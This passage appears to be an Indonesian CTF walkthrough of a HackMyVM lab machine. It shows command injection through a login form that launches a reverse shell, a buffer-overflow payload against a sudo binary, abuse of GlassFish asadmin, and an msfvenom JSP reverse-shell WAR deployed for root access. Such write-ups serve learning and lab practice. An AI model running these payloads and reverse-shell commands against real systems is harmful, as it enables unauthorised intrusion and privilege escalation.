    </form>
  </div>
  <div style="background-color:#ecf2d0;padding:20px;border-radius:0px 0px 20px 20px" align="center">
      </div>
  </body>
</html>
╭─ via [machines/discover]
╰─ python -c 'import urllib.parse; string = "bash /dev/shm/shell.sh"; print(urllib.parse.quote_plus(string))'              
bash+%2Fdev%2Fshm%2Fshell.sh
╭─ via [machines/discover]
╰─ curl -s "http://log.discover.hmv/index.php?username=bash+%2Fdev%2Fshm%2Fshell.sh&password=aaaaaaaaaaa"

--------------
---- NCAT ----
--------------

╭─ via [machines/discover]
╰─ ncat -nvlp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 192.168.56.8.
Ncat: Connection from 192.168.56.8:33140.
bash: cannot set terminal process group (475): Inappropriate ioctl for device
bash: no job control in this shell
www-data@debian:/var/www/html/botdiscover$ 

```
boom!

## shell as discover

sebelumnya, saya cek terlebih dahulu ada berapa user di dalam machine ini
```sh
www-data@debian:/var/www/html/botdiscover$ grep -i sh$ /etc/passwd
grep -i sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
discover:x:1000:1000:discover,,,:/home/discover:/bin/bash
```
ternyata hanya 2, jadi saya tidak perlu repot repot untuk enumeration lebih lanjut.

![image212312](https://i.ibb.co/6nF2YZB/image.png)

saat sudah selesai menjalankan *linpeas* saya menemukan ini pada **sudo -l**. lalu saat saya cek ternyata memang betul basic overflow yang biasanya ada di acara CTF yang easy-easy itu.
```sh
www-data@debian:/opt$ ls
ls
glassfish6
hint
overflow
www-data@debian:/opt$ cat hint
cat hint
AAAAAAAAAAAAAAAAAAAAAAAA"+"\x5d\x06\x40\x00
```
bahkan ada hint-nya, mungkin si creator mikirin partisipan member sini juga ya.
```sh
www-data@debian:/opt$ sudo -u discover /opt/overflow $(python3 -c 'print("AAAAAAAAAAAAAAAAAAAAAAAA\x5d\x06\x40\x00")')
<print("AAAAAAAAAAAAAAAAAAAAAAAA\x5d\x06\x40\x00")')
bash: warning: command substitution: ignored null byte in input
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(discover) gid=1000(discover) groups=1000(discover),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

```
## privilege escalation

setelah membaca cukup lama dokumentasi pada binary **asadmin**, saya menemukan list domain yang dipakai pada port **4848**. tetapi saya tidak tahu pasti *credential* yang dipakai oleh domain container tersebut, jadi saya membuat domain container dengan akun admin yang baru lagi, lalu memberhentikan **domain1** *container* dan mencoba menjalankan domain **sharpicx** pada port **4848** lalu mengaktifkan *secure admin* pada domain **sharpicx**.
```sh
discover@debian:/opt/glassfish6/glassfish/domains$ sudo /opt/glassfish6/bin/asadmin stop-domain domain1
Waiting for the domain to stop .........
Command stop-domain executed successfully.
discover@debian:/opt/glassfish6/glassfish/domains$ sudo /opt/glassfish6/bin/asadmin create-domain sharpicx
Enter admin user name [Enter to accept default "admin" / no password]>sharpicx
Enter the admin password [Enter to accept default of no password]> 
Enter the admin password again> 
Using default port 4848 for Admin.
Using default port 8080 for HTTP Instance.
Using default port 7676 for JMS.
Using default port 3700 for IIOP.
Using default port 8181 for HTTP_SSL.
Using default port 3820 for IIOP_SSL.
Using default port 3920 for IIOP_MUTUALAUTH.
Using default port 8686 for JMX_ADMIN.
Using default port 6666 for OSGI_SHELL.
Using default port 9009 for JAVA_DEBUGGER.
Distinguished Name of the self-signed X.509 Server Certificate is:
[CN=debian,OU=GlassFish,O=Eclipse.org Foundation Inc,L=Ottawa,ST=Ontario,C=CA]
Distinguished Name of the self-signed X.509 Server Certificate is:
[CN=debian-instance,OU=GlassFish,O=Eclipse.org Foundation Inc,L=Ottawa,ST=Ontario,C=CA]
Domain sharpicx created.
Domain sharpicx admin port is 4848.
Domain sharpicx admin user is "sharpicx".
Command create-domain executed successfully.
discover@debian:/opt/glassfish6/glassfish/domains$ sudo /opt/glassfish6/bin/asadmin start-domain sharpicx
discover@debian:/opt/glassfish6/glassfish/domains$ sudo /opt/glassfish6/bin/asadmin enable-secure-admin
Enter admin user name>  sharpicx
Enter admin password for user "sharpicx"> 
You must restart all running servers for the change in secure admin to take effect.
Command enable-secure-admin executed successfully.

```
lalu login pada port **4848** dengan *credential* yang baru saja dibuat, **sharpicx:sharpicx** kemudian saya mencari laman untuk upload *reverse shell* yang bisa dieksekusi pada laman ini, karena based on *Java* maka *reverse shell* yang dipakai **JSP** atau **Java Server Pages** atau bisa juga dengan *WAR extension* karena termasuk *web component* pada java web server. 

dengan begitu saya membuat *revshell* menggunakan **msfvenom**.
```sh
╭─ via [machines/discover]
╰─ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.1 LPORT=12345 -f war > shell.war  
Payload size: 1100 bytes
Final size of war file: 1100 bytes

```
lalu setelah itu, saya mencari-cari laman mana yang bisa digunakan untuk upload *revshell*. dan ketemulah bagian *Applications* lalu saya klik *Deploy* dan disana tidak dibatasi format apa yang harus diakses, jadi saya langsung pasang shell dan upload.

![adasdas](https://i.ibb.co/5j1wDV1/image.png)

lalu balik lagi pada tab *Applications*, saya klik label *launch* lalu muncullah tampilan seperti ini.

![asdasdassda](https://i.ibb.co/DrKSdTC/image.png)

lalu saya nyalakan **msfconsole** dan menggunakan *multi/handler* untuk merespon koneksi TCP dari reverse shellnya. setelah itu saya klik kedua link tersebut dan BOOM!

![imagesss](https://i.ibb.co/BZ7F6jm/image.png)


## References
* <https://www.ibm.com/docs/en/app-connect/11.0.0?topic=corba-naming-service>
* <https://techcolleague.com/what-is-devshm-and-what-is-it-used-for/>
* <https://github.com/frizb/MSF-Venom-Cheatsheet>
* <https://docs.oracle.com/cd/E26576_01/doc.312/e24938/preface.htm#GSRFM442>
* <https://glassfish.org/docs/latest/reference-manual/asadmin.html>
* <https://github.com/naivenom/exploiting/blob/master/angstromctf2016/buffer_overflow2.py>
* <https://0xdf.gitlab.io/2022/01/08/htb-previse.html>
